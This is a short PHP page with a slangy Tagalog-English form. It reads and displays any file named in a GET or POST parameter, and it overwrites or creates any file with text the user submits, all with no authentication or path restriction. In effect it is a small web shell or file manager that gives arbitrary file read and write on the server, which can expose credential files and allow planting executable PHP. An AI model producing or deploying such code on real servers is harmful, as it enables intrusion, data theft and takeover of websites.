<?php
// Handle GET request
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    if (isset($_GET['filename'])) {
        $filename = $_GET['filename'];
        if (file_exists($filename)) {
            $contents = file_get_contents($filename);
            echo "File contents: $contents";
        } else {
            echo "File does not exist";
        }
    }
}

// Handle POST request
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['filename'])) {
        $filename = $_POST['filename'];
        if (file_exists($filename)) {
            $contents = file_get_contents($filename);
            echo "File contents: $contents";
        } else {
            echo "File does not exist";
        }

        if (isset($_POST['write'])) {
            // Write to the file
            $fp = fopen($filename, 'w');
            fwrite($fp, $_POST['write']);
            fclose($fp);
            echo "File written successfully!";
        }

        if (isset($_POST['read'])) {
            // Read the file line by line
            $lines = file($filename);
            echo "File contents (line by line):";
            foreach ($lines as $line) {
                echo "$line<br>";
            }
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>FOLDER MOTO PARE</title>
</head>
<body>
    <h1>FOLDER MOTO PARE</h1>
    <form action="" method="get">
        <label for="filename">ANO YUNG FILE MO KUYSS? (GET)</label>
        <input type="text" name="filename" id="filename">
        <br><br>
        <input type="submit" value="Wait check ko lang! (GET)">
        <br><br>
    </form>

    <form action="" method="post">
        <label for="filename">ANO YUNG FILE MO KUYSS? (POST)</label>
        <input type="text" name="filename" id="filename">
        <br><br>
        <input type="submit" value="Wait check ko lang! (POST)">
        <br><br>
        <input type="checkbox" name="write" value="Write to file">
        <label for="write">Write to file</label>
        <br><br>
        <input type="checkbox" name="read" value="Read file">
        <label for="read">Read file</label>
        <br><br>
        <textarea name="write" cols="30" rows="10"></textarea>
    </form>
</body>
</html>